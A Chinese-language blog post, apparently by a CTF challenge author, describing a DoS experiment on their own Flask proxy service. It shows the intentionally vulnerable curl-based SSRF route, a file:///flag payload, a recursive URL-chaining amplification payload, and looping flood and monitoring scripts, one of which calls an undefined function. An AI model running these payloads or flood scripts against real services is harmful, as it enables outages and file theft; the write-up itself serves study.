@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all寒假EOF後好像都沒打什麼資安的東東，頂多出題ww所以上來水個文章前天回到社團CTF平台突然看到我前陣子出的 Birthday SSRF(在這邊再次感謝🦈贊助商麻麻(逃))Anyway，重新回去看了一下github repo發現我的proxy 除了 ssrf的洞口，好像也能打出Denial of Service(簡稱DoS的攻擊)太好玩了吧，來實驗吧XD(   Why?Wha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A simple DoS experiment on proxy service">
+<meta property="og:url" content="http://wha13.github.io/2024/02/13/proxy-dos/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all寒假EOF後好像都沒打什麼資安的東東，頂多出題ww所以上來水個文章前天回到社團CTF平台突然看到我前陣子出的 Birthday SSRF(在這邊再次感謝🦈贊助商麻麻(逃))Anyway，重新回去看了一下github repo發現我的proxy 除了 ssrf的洞口，好像也能打出Denial of Service(簡稱DoS的攻擊)太好玩了吧，來實驗吧XD(   Why?Wha">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyLXEausT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyREV6dsp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1q5ET_jp.png">
+<meta property="og:image" content="https://i.postimg.cc/ZnBGF6DW/A062879-D-7-F05-4-E13-ADE6-D1-A7-E1932-C3-A.png">
+<meta property="article:published_time" content="2024-02-13T10:07:15.000Z">
+<meta property="article:modified_time" content="2024-02-13T10:31:53.543Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="DoS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/HyLXEausT.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>A simple DoS experiment on proxy service</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/05/2024EOFFINAL/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/02/13/proxy-dos/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/02/13/proxy-dos/&text=A simple DoS experiment on proxy service"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/02/13/proxy-dos/&is_video=false&description=A simple DoS experiment on proxy service"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=A simple DoS experiment on proxy service&body=Check out this article: http://wha13.github.io/2024/02/13/proxy-dos/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/02/13/proxy-dos/&name=A simple DoS experiment on proxy service&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/02/13/proxy-dos/&t=A simple DoS experiment on proxy service"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Why"><span class="toc-number">2.</span> <span class="toc-text">Why?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-DoS"><span class="toc-number">2.1.</span> <span class="toc-text">What is DoS?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How2Vuln"><span class="toc-number">2.2.</span> <span class="toc-text">How2Vuln?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Result"><span class="toc-number">3.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        A simple DoS experiment on proxy service
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-13T10:07:15.000Z" class="dt-published" itemprop="datePublished">2024-02-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/DoS/" rel="tag">DoS</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>寒假EOF後好像都沒打什麼資安的東東，頂多出題ww<br><del>所以上來水個文章</del><br>前天回到社團CTF平台突然看到我前陣子出的 Birthday SSRF(在這邊再次感謝🦈贊助商麻麻(逃))<br>Anyway，重新回去看了一下github repo發現我的proxy 除了 ssrf的洞口，好像也能打出Denial of Service(簡稱DoS的攻擊)<br>太好玩了吧，來實驗吧XD(  </p>
+<h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><h3 id="What-is-DoS"><a href="#What-is-DoS" class="headerlink" title="What is DoS?"></a>What is DoS?</h3><p>Denial of Service，簡單來說就是透過一台電腦的攻擊用光一個網站伺服器的記憶體，造成其他使用者無法連上該網站的阻斷式攻擊，常見的就是各種flood，不論是基於UDP啦，ICMP也好，SYN也好，anyway，只要能打的都算。<br>但我自己其實不太喜歡這類型的攻擊(感覺偏無腦而且自己也很耗能(逃<br>但是咧，以前也有聽過什麼RCE後可以打得fork bomb，基於應用層的cookie bomb等等的，也覺得這塊很有趣，所以自己後來做code review也都會去想這塊。</p>
+<h3 id="How2Vuln"><a href="#How2Vuln" class="headerlink" title="How2Vuln?"></a>How2Vuln?</h3><p>ok，先來看這支用flask搓出來的程式裡的其中一段：  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/@&lt;path:url&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">url</span>):</span><br><span class="line">    res = subprocess.run([<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, url], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> res.stdout</span><br></pre></td></tr></table></figure>
+<p>ㄟ都，顯然有SSRF不用問，而這題在社團練習平台就是簡單的去請求：<code>@file:///flag</code>就好。<br>但是今天如果我能利用一個url讓機器去做事n次呢?<br>想想看，SSRF的時候就是去curl本地的內容去抓東西，那我不就可以遞迴式地讓它去解析url嗎?<br><strong>Example:</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bd-dos-whale.onrender.com/@https://bd-dos-whale.onrender.com/@https://bd-dos-whale.onrender.com/@https://bd-dos-whale.onrender.com/@</span><br></pre></td></tr></table></figure>
+<p>這個，會讓機器在接收一個url後做三次請求，四次回應，怎麼看都知道越串越多會越耗記憶體。<br>OK，想法很簡單，但是到底能造成多大的傷害呢?  </p>
+<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p>開100個threads進行一次DoS<br><strong>run.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;curl -o log -s &#x27;</span>+<span class="string">&#x27;https://bd-dos-whale.onrender.com/@&#x27;</span>*<span class="number">700</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    threads.append(threading.Thread(target = exploit, args = (i,)))</span><br><span class="line">    threads[i].start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    threads[i].join()</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;pwned finished.&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>主攻擊腳本，就是無腦開run.py<br><strong>exp.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;python3 run.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>監測service status的腳本<br><strong>check.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;200&#x27;</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s=<span class="built_in">str</span>(req.get(<span class="string">&#x27;https://bd-dos-whale.onrender.com/&#x27;</span>).status_code)</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&#x27;200&#x27;</span>:</span><br><span class="line">        a[s]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[<span class="string">&#x27;1&#x27;</span>]+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+<p>實驗咯~~<br>這是我開了十五分鐘後<strong>check.py</strong>回傳的結果：<br><img src="https://hackmd.io/_uploads/HyLXEausT.png" alt="image">  </p>
+<p>可以說幾乎把服務給阻斷了。(1是不正常，200是正常)<br><img src="https://hackmd.io/_uploads/HyREV6dsp.png" alt="image">  </p>
+<p>ERR<br>p.s.我昨天其實開了一晚上的DoS，但不知道是什麼原因能連上的機率大概還有1&#x2F;3(?!)<br>推測應該是render搭配的cloudfare很棒的清洗魔法在做功。<br>清洗速度賊快咧~<br><img src="https://hackmd.io/_uploads/B1q5ET_jp.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>不想開學，給沒有去看我靶機的觀眾看一下本來頁面的棒圖owo：<br><img src="https://i.postimg.cc/ZnBGF6DW/A062879-D-7-F05-4-E13-ADE6-D1-A7-E1932-C3-A.png" alt="rahhhhh">  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Why"><span class="toc-number">2.</span> <span class="toc-text">Why?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-DoS"><span class="toc-number">2.1.</span> <span class="toc-text">What is DoS?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How2Vuln"><span class="toc-number">2.2.</span> <span class="toc-text">How2Vuln?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Result"><span class="toc-number">3.</span> <span class="toc-text">Result</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/02/13/proxy-dos/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/02/13/proxy-dos/&text=A simple DoS experiment on proxy service"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/02/13/proxy-dos/&is_video=false&description=A simple DoS experiment on proxy service"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=A simple DoS experiment on proxy service&body=Check out this article: http://wha13.github.io/2024/02/13/proxy-dos/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/02/13/proxy-dos/&title=A simple DoS experiment on proxy service"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/02/13/proxy-dos/&name=A simple DoS experiment on proxy service&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/02/13/proxy-dos/&t=A simple DoS experiment on proxy service"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
